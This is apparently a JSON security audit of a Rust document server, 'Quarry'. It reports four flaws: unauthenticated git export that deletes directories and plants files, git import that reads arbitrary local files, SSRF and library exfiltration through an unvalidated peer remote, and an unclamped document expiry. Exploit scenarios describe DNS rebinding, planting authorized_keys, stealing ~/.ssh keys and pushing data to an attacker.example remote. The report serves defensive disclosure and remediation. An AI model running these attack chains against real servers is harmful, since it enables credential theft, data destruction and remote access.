```json
{
  "findings": [
    {
      "file": "crates/quarry-server/src/git_handlers.rs",
      "line": 132,
      "ruleId": "path-traversal.arbitrary-local-path",
      "identity": { "anchor": "git-export-repo-path" },
      "category": "authorization",
      "severity": "HIGH",
      "difficulty": "MEDIUM",
      "confidence": "HIGH",
      "title": "Unauthenticated git export takes an arbitrary local directory and wipes/overwrites it",
      "rationale": "POST /v1/libraries/{library}/git/export accepts a caller-supplied `repo` filesystem path and passes it to quarry-git's export routine without any validation, canonicalization, or containment check. The export creates the directory if missing, deletes every entry in it except `.git` (clean_worktree), and writes attacker-influenced document files into it. The entire /v1/libraries/** surface has no authentication, no authorization layer, and no Host/Origin check, so anyone who can reach the port — including a web page the operator visits, via DNS rebinding against the default loopback bind — can destroy or overwrite arbitrary directories with the server process's privileges, e.g. wipe a home directory and plant ~/.ssh/authorized_keys for remote code execution.",
      "evidence": "Source: the route POST /v1/libraries/{library}/git/export is registered with no auth middleware in crates/quarry-server/src/lib.rs:464-467 (install_git_routes; the whole router in router_with_state at lib.rs:196-219 has only tracing/security-header layers). crates/quarry-server/src/git_handlers.rs:108-114 defines GitExportRequest { repo: String, ... }; handler git_export (git_handlers.rs:123-137) passes it straight to quarry_git::export_worktree(&state.store, &library, std::path::Path::new(&request.repo), ...) at git_handlers.rs:129-135 with zero validation. In crates/quarry-git/src/lib.rs, execute_worktree_export (line 1029) runs: fs::create_dir_all(&plan.repo_dir) (1030); verify_or_write_marker (1031) which, per lines 1195-1209, only refuses when a .quarry/marker.json already exists AND names a different library — for any other directory it silently writes the marker and proceeds; then clean_worktree(&plan.repo_dir) (1032), defined at lines 1254-1269, which iterates fs::read_dir(repo_dir) and calls fs::remove_dir_all / fs::remove_file on EVERY entry except `.git`. Then lines 1036-1047 join attacker-influenced document paths (plan.repo_dir.join(&file.path), 1036), create parent dirs (1037-1039), and write file contents (write_atomic, 1041-1047). Document paths and contents are attacker-controlled because PUT /v1/libraries/{library}/documents/{*path} is equally unauthenticated (route at lib.rs:407-414), and the only path guard, quarry_core::normalize_path (crates/quarry-core/src/lib.rs:606-628, applied at crates/quarry-storage/src/documents.rs:84), rejects `..`, `\\`, and the reserved `.quarry/` prefix but happily accepts dotfile paths such as `.ssh/authorized_keys`. The same sink is reachable via stored peer configs: push_peer_inner (quarry-git/src/lib.rs:215-245) calls export_worktree on the unvalidated peer `repo` before pushing. No effective defense exists anywhere on this path: the loopback default is not a control (the server does not validate Host or Origin headers, so a same-origin DNS-rebinding attack from any website the operator opens reaches the loopback listener), and binding to a non-loopback address only produces a stderr warning (warn_if_non_loopback, crates/quarry-server/src/lib.rs:692-704).",
      "snippet": "            std::path::Path::new(&request.repo),",
      "symbol": "git_export",
      "impact": "Remote, unauthenticated destruction of arbitrary directories the server process can write (clean_worktree deletes everything except .git in the chosen directory) followed by overwrite with attacker-chosen content at attacker-chosen relative paths — e.g. exporting with repo=/home/<user> deletes the user's home contents and writes .ssh/authorized_keys with the attacker's key, yielding shell access as that user; equally usable against application data, configuration, or credential files, with all of the store's libraries reachable for content staging.",
      "exploitScenarios": [
        "Victim runs a Quarry server built with the lib-documents feature (full local build) on its default 127.0.0.1:7831 bind; the victim browses to an attacker-controlled website whose DNS record is rebound to 127.0.0.1, making the page's fetch() calls same-origin with the server (no CORS preflight, and the server never checks Host/Origin).",
        "The page issues GET /v1/libraries to enumerate libraries (unauthenticated), then PUT /v1/libraries/{lib}/documents/.ssh/authorized_keys with a body containing the attacker's public key.",
        "The page issues POST /v1/libraries/{lib}/git/export with {\"repo\": \"/home/victim\"}.",
        "execute_worktree_export creates the marker, then clean_worktree deletes every file and directory in /home/victim except .git, then writes the staged document to /home/victim/.ssh/authorized_keys.",
        "The attacker SSHs into the victim machine with the planted key; alternatively the attacker points repo at application data directories purely to destroy them."
      ],
      "preconditions": [
        "Server binary built with the non-default `lib-documents` cargo feature (the shipped tmp-documents image does not contain these routes).",
        "Attacker can reach the HTTP port: directly when the server is bound to a non-loopback address (only a log warning fires), or from a web page the operator visits via DNS rebinding against the default loopback bind, since no authentication, Host validation, or Origin check exists."
      ],
      "recommendations": [
        "Root cause: stop accepting arbitrary filesystem paths from the git import/export/peer request bodies. Canonicalize the requested `repo` and require it to live under an explicit operator-configured base directory (e.g. QUARRY_ROOT/git or an allowlist); reject absolute paths, `..` segments, and symlinks escaping that root.",
        "Hardening: make export refuse to run clean_worktree in any directory that is not already marked for this exact library (use verify_marker semantics instead of verify_or_write_marker), and never delete unmarked non-empty directories; add authentication plus Host/Origin validation to the /v1/libraries/** surface so loopback binds are not reachable via DNS rebinding.",
        "Regression test: POST /git/export and /git/import with repo values outside the allowed root (absolute path, `..` escape, symlink) must fail with 400; an export targeting an existing non-empty directory without a matching marker must not delete any file."
      ],
      "cweId": "CWE-73"
    },
    {
      "file": "crates/quarry-server/src/git_handlers.rs",
      "line": 104,
      "ruleId": "path-traversal.arbitrary-local-path",
      "identity": { "anchor": "git-import-repo-path" },
      "category": "authorization",
      "severity": "HIGH",
      "difficulty": "MEDIUM",
      "confidence": "HIGH",
      "title": "Unauthenticated git import reads arbitrary local directories into the document store",
      "rationale": "POST /v1/libraries/{library}/git/import accepts a caller-supplied `repo` path and recursively reads every regular file under it into the Quarry store, where the contents are immediately readable over the unauthenticated documents REST API. There is no path validation, allowlist, or containment check between the request body and the filesystem walk, giving a remote attacker arbitrary local file read with the server process's privileges.",
      "evidence": "Source: route POST /v1/libraries/{library}/git/import registered with no auth in crates/quarry-server/src/lib.rs:461-463. crates/quarry-server/src/git_handlers.rs:86-89 defines GitImportRequest { repo: String }; handler git_import (98-106) calls import_worktree(&state.store, &library, std::path::Path::new(&request.repo)) at line 104 with no validation. In crates/quarry-git/src/lib.rs, import_worktree (825-851) only checks that the directory exists (ensure_worktree_exists, 853-868 — no marker or ownership check on plain import) and then read_worktree_import_files → scan_worktree_import_files (881-929): WalkDir::new(repo_dir) walks the entire attacker-chosen tree (filter only excludes entries literally named .git or .quarry, 887-890), and fs::read(entry.path()) at line 903 loads every regular file's bytes into a WorktreeImportFile; files ending in .md get frontmatter treatment, all other files are imported verbatim (904-916). import_worktree_transaction (931+) stores each file as a document in the named library. The attacker then reads the exfiltrated contents back through the unauthenticated GET /v1/libraries/{library}/documents/{*path} route (crates/quarry-server/src/lib.rs:407-414 → document_handlers::get_document). WalkDir does not follow symlinks, but pointing `repo` directly at the target directory (e.g. /home/victim/.ssh, /etc, a cloud-credentials directory) reads every regular file inside it. No defense exists on this path; reachability is identical to the export endpoint (no auth, no Host/Origin check; loopback default is bypassable by DNS rebinding).",
      "snippet": "        import_worktree(&state.store, &library, std::path::Path::new(&request.repo)).await?,",
      "symbol": "git_import",
      "impact": "Remote, unauthenticated arbitrary local file read: any file readable by the server process (SSH keys, cloud credentials, /etc files, other tenants' local data, the Quarry database directory itself, which contains cleartext tmp-document capability secrets) is copied into the attacker's chosen library and returned over the REST API.",
      "exploitScenarios": [
        "Attacker reaches the lib-documents build's HTTP port directly (non-loopback bind) or via DNS rebinding from a web page the operator visits (no Host/Origin validation, no auth).",
        "Attacker issues GET /v1/libraries to learn a library slug (or creates one via POST /v1/libraries).",
        "Attacker issues POST /v1/libraries/{lib}/git/import with {\"repo\": \"/home/victim/.ssh\"}.",
        "scan_worktree_import_files walks the directory and fs::read loads id_rsa, id_ed25519, config, etc. into the store as documents.",
        "Attacker issues GET /v1/libraries/{lib}/documents/id_rsa and recovers the private key; repeats with /etc, ~/.config, ~/.aws, or the QUARRY_ROOT database directory to harvest cleartext tmp-document secrets."
      ],
      "preconditions": [
        "Server binary built with the non-default `lib-documents` cargo feature.",
        "Attacker can reach the HTTP port (directly on a non-loopback bind, or via DNS rebinding against the default loopback bind because there is no auth or Host/Origin check).",
        "Target files are readable by the server process user."
      ],
      "recommendations": [
        "Root cause: validate the import `repo` path the same way as export — canonicalize and confine it to an explicit operator-configured base directory; reject paths outside it.",
        "Hardening: require a matching .quarry marker before importing from a directory (import currently skips the marker check entirely), and add authentication plus Host/Origin validation to the /v1/libraries/** surface.",
        "Regression test: git import with repo pointing outside the allowed root (e.g. /etc, $HOME, a `..` escape) must fail with 400 and must not create any document."
      ],
      "cweId": "CWE-73"
    },
    {
      "file": "crates/quarry-server/src/git_handlers.rs",
      "line": 65,
      "ruleId": "ssrf.git-remote-url",
      "identity": { "anchor": "git-peer-remote-url" },
      "category": "authorization",
      "severity": "MEDIUM",
      "difficulty": "MEDIUM",
      "confidence": "HIGH",
      "title": "Git peer remote URL is stored unvalidated and later fetched/pushed, enabling SSRF and library exfiltration",
      "rationale": "POST /v1/libraries/{library}/git/peers stores a caller-supplied `remote` URL verbatim. The pull/sync endpoints then make libgit2 fetch or clone from that URL, and the push endpoint pushes the entire exported library to it — all with no scheme allowlist, host validation, or egress control. Because libgit2 supports http(s)://, git://, ssh://, and file://, an unauthenticated attacker can coerce the server into outbound connections to internal services and can exfiltrate every document in a library to an attacker-controlled git remote.",
      "evidence": "Source: route POST /v1/libraries/{library}/git/peers registered with no auth (crates/quarry-server/src/lib.rs:457-459). Handler create_git_peer (crates/quarry-server/src/git_handlers.rs:55-71) takes GitPeerRequest { repo, remote, branch } (41-46) and stores the remote unvalidated: config object gets \"remote\": request.remote at git_handlers.rs:64-65, persisted via state.store.create_git_peer (69; config stored verbatim in sync_peers.config_json, crates/quarry-storage/src/sync.rs). Sinks: on POST .../peers/{peer}/pull (route lib.rs:469-471) pull_peer_inner (crates/quarry-git/src/lib.rs:280-323) re-hydrates the stored URL via peer_config (1476-1510: `remote` read straight from config JSON at 1493-1498, no validation) and calls fetch_remote_worktree(&peer.repo, remote, &peer.branch) at 296-298 → fetch_remote_worktree_blocking (1326-1372) performs remote.fetch(&[branch], ...) at 1332-1334 or RepoBuilder::clone(remote_url, repo_dir) at 1360-1362 against the attacker URL, including file:// and internal http(s):// endpoints; the pulled worktree is then imported into the library (import_worktree at 300) and readable over the unauthenticated documents API (verify_marker at 299 is bypassable because the attacker learns the library id from the unauthenticated GET /v1/libraries and can plant a matching .quarry/marker.json in the malicious remote). On POST .../peers/{peer}/push, push_peer_inner (215-268) exports the full library and pushes it to the stored URL via push_remote (243-245) → remote.push at 1407-1408, exfiltrating all document contents to the attacker's server. The stored `branch` is likewise unvalidated and is interpolated into refspecs (format!(\"refs/heads/{branch}:refs/heads/{branch}\") at 1405, refs/remotes/origin/{branch} at 1375), a secondary ref-format injection. No allowlist or egress control exists anywhere on this path; the server otherwise makes no outbound connections by design.",
      "snippet": "        object.insert(\"remote\".to_string(), JsonValue::String(remote));",
      "symbol": "create_git_peer",
      "impact": "Unauthenticated SSRF: the server initiates outbound git-protocol connections to attacker-chosen URLs, including internal network addresses (http/https/git/ssh) and file:// clones of local repositories; and one-way exfiltration of an entire library's document contents to an attacker-operated git remote via the push endpoint.",
      "exploitScenarios": [
        "Attacker reaches the lib-documents build's HTTP port directly or via DNS rebinding (no auth, no Host/Origin check).",
        "Attacker issues POST /v1/libraries/{lib}/git/peers with {\"repo\": \"/tmp/x\", \"remote\": \"https://attacker.example/capture.git\"}.",
        "Attacker issues POST /v1/libraries/{lib}/git/peers/{peer}/push; push_peer_inner exports every document in the library and libgit2 pushes them to the attacker's remote, exfiltrating the full library.",
        "For SSRF: the attacker instead sets remote to http://169.254.169.254/... or an internal git/smart-http endpoint and calls pull; the server fetches/clones from the internal address, and fetched content is imported into the library where the attacker reads it back over the unauthenticated documents API."
      ],
      "preconditions": [
        "Server binary built with the non-default `lib-documents` cargo feature.",
        "Attacker can reach the HTTP port (directly on a non-loopback bind, or via DNS rebinding against the default loopback bind).",
        "For push exfiltration, the attacker operates a reachable git remote; for pull-based SSRF content recovery, the target URL must speak the git smart protocol (or file:// for local repositories)."
      ],
      "recommendations": [
        "Root cause: validate the peer `remote` URL at creation time — parse it and enforce a scheme and host allowlist (e.g. https only, operator-configured allowed hosts); reject file://, git://, ssh://, loopback, link-local, and RFC1918 targets by default. Validate `branch` as a well-formed git refname component (no '/', ':', or control characters) before it is interpolated into refspecs.",
        "Hardening: re-validate the stored URL again at fetch/push time so peers created before validation existed cannot be abused, and add authentication plus Host/Origin checks to the /v1/libraries/** surface.",
        "Regression test: creating a peer with remote=file:///etc, http://127.0.0.1, or http://169.254.169.254 must be rejected with 400, and pull/push against a peer whose stored URL fails validation must refuse to open a connection."
      ],
      "cweId": "CWE-918"
    },
    {
      "file": "crates/quarry-server/src/tmp_document_handlers.rs",
      "line": 82,
      "ruleId": "improper-input-validation.unclamped-ttl",
      "identity": { "anchor": "tmp-document-ttl-clamp" },
      "category": "injection",
      "severity": "LOW",
      "difficulty": "LOW",
      "confidence": "HIGH",
      "title": "Client-supplied tmp-document expires_at is stored verbatim with no format validation or maximum-TTL clamp",
      "rationale": "Anonymous document creation and the TTL update endpoint accept a caller-supplied expires_at string and store it unvalidated and unclamped. Expiry checks compare the stored string lexicographically against the current RFC3339 timestamp, so any value that sorts after 'now' — a far-future date or even a non-date string — makes the document permanently live. This defeats the 30-day default lifecycle that is the platform's only built-in bound on anonymously hosted content.",
      "evidence": "Source: POST /v1/tmp/documents is unauthenticated by design (route at crates/quarry-server/src/lib.rs:354-358). CreateTmpDocumentRequest.expires_at (crates/quarry-server/src/tmp_document_handlers.rs:36) is mapped straight into TmpTtl::ExpiresAt at tmp_document_handlers.rs:80-83 (`.map(quarry_storage::TmpTtl::ExpiresAt)`) with no parsing. In crates/quarry-storage/src/tmp_documents.rs:192-199 the ExpiresAt arm stores the string verbatim (`TmpTtl::ExpiresAt(expires_at) => expires_at,` at line 198) and it is written to documents.expires_at (UPDATE ... SET expires_at at 238-243 / insert via ensure_tmp_document_with_creation_ip_conn). The update path PATCH /v1/tmp/documents/{secret}/ttl is the same: set_tmp_document_ttl (tmp_documents.rs:388-416) rejects only a null value and UPDATEs the raw string (406-411). No code path parses the value as a date — a repo-wide check shows chrono DateTime parsing exists only on unrelated paths (session.rs, versions.rs, FUSE), never on the tmp TTL write path. Expiry enforcement is a string comparison: document_identity_conn filters `AND expires_at > ?2` with ?2 = the current RFC3339 timestamp (crates/quarry-storage/src/lib.rs:1502-1508; the tmp variant has no IS NULL allowance, so the comparison is mandatory), and error_if_tmp_document_expired uses `expires_at <= ?2` (lib.rs:1405-1411). Any string sorting lexicographically after the current timestamp (e.g. \"9999-12-31T00:00:00.000Z\", or simply \"z\") therefore keeps the document live forever, where the intended default is 30 days (default_tmp_expires_at, lib.rs:1368-1370).",
      "snippet": "        .map(quarry_storage::TmpTtl::ExpiresAt)",
      "symbol": "create_tmp_document",
      "impact": "An anonymous attacker pins arbitrary content (phishing pages, malware, illicit material) at a stable quarry-hosted URL indefinitely, defeating the document expiry lifecycle the service's anonymous-creation abuse posture relies on and leaving content resident (and served) with no time bound; repeated use also accrues permanent storage.",
      "exploitScenarios": [
        "Attacker issues POST /v1/tmp/documents with {\"content\": \"<phishing markdown>\", \"expires_at\": \"9999-12-31T00:00:00.000Z\"} (no account or credential needed).",
        "The server stores the literal string; every subsequent access check compares it lexicographically against the current timestamp and treats the document as unexpired.",
        "The document — and any non-markdown abuse hosted behind the same origin — remains served at its capability URL indefinitely instead of expiring after the 30-day default."
      ],
      "preconditions": [
        "Attacker can reach the tmp-documents API (true for the default shipped build, by design anonymous).",
        "No other conditions; the flaw is in default request handling."
      ],
      "recommendations": [
        "Root cause: parse expires_at as RFC3339 on both create and the ttl PATCH, reject unparseable values with 400, and clamp the result to now + a server-side maximum TTL (e.g. 30 days) before storing.",
        "Hardening: run a background reaper that deletes expired tmp documents (and their CAS blobs) so storage is actually reclaimed, rather than relying solely on access-time expiry checks.",
        "Regression test: creating or updating a tmp document with expires_at beyond the maximum yields the clamped value, and a non-date string such as \"z\" is rejected with INVALID_REQUEST."
      ],
      "cweId": "CWE-20"
    }
  ]
}
```